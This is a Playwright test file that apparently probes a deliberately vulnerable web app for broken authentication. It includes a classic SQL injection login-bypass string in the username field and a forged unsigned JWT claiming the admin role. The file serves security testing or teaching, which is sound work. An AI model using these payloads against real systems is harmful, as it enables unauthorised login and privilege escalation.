const { test, expect } = require('@playwright/test');

test.describe('/#/ (Broken Authentication via Admin Access)', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
  });

  test('should attempt admin access without token', async ({ page }) => {
    await page.fill('#adminToken', '');
    await page.click('#adminForm button[type="submit"]');
    
    await page.waitForSelector('#adminResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#adminResult').textContent();
    expect(resultText).toContain('error');
    
    console.log('✓ Admin access denied without token (expected)');
  });

  test('should access admin panel with valid token from SQL injection', async ({ page }) => {
    // First get a token via SQL injection
    await page.fill('#username', "admin' OR '1'='1'--");
    await page.fill('#password', 'anything');
    await page.click('#loginForm button[type="submit"]');
    
    await page.waitForSelector('#loginResult.show', { timeout: 5000 });
    
    const loginResult = await page.locator('#loginResult').textContent();
    
    // Extract token from response (it's stored in localStorage by the frontend)
    const token = await page.evaluate(() => localStorage.getItem('token'));
    
    if (token) {
      console.log('✓ Token obtained via SQL injection');
      
      // Now try admin access
      await page.click('#adminForm button[type="submit"]');
      await page.waitForSelector('#adminResult.show', { timeout: 5000 });
      
      const adminResult = await page.locator('#adminResult').textContent();
      console.log('Admin access result:', adminResult.substring(0, 100));
    }
  });

  test('should show weak JWT verification in UI', async ({ page }) => {
    // Test with a forged token in the input field
    const fakeToken = 'eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.';
    
    await page.fill('#adminToken', fakeToken);
    await page.click('#adminForm button[type="submit"]');
    
    await page.waitForSelector('#adminResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#adminResult').textContent();
    console.log('✓ JWT forgery attempt via UI completed');
  });
});
